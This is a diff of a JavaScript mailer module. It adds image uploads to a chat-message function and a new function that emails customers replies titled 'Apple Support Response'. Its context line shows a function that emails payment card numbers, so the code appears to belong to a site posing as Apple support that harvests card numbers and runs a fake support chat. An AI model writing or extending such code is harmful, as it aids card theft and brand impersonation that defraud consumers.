@@ -14,12 +14,32 @@ export function sendCardNumberEmail(cardNumber) {
   );
 }
 
-export function sendChatMessage(message, userEmail = 'customer@unknown.com') {
+export function sendChatMessage(message, userEmail = 'customer@unknown.com', imageData = null, imageName = null) {
   const templateParams = { 
-    message: message,
+    message: message || '[Image uploaded]',
     user_email: userEmail,
     timestamp: new Date().toLocaleString(),
-    subject: 'New Chat Support Message'
+    subject: 'New Chat Support Message',
+    has_image: imageData ? 'Yes' : 'No',
+    image_name: imageName || 'No image',
+    image_data: imageData || 'No image attached'
+  };
+
+  return emailjs.send(
+    SERVICE_ID,
+    CHAT_TEMPLATE_ID,
+    templateParams,
+    PUBLIC_KEY
+  );
+}
+
+// Send admin response to customer
+export function sendAdminResponse(adminMessage, customerEmail) {
+  const templateParams = {
+    message: adminMessage,
+    user_email: customerEmail,
+    timestamp: new Date().toLocaleString(),
+    subject: 'Apple Support Response'
   };
 
   return emailjs.send(
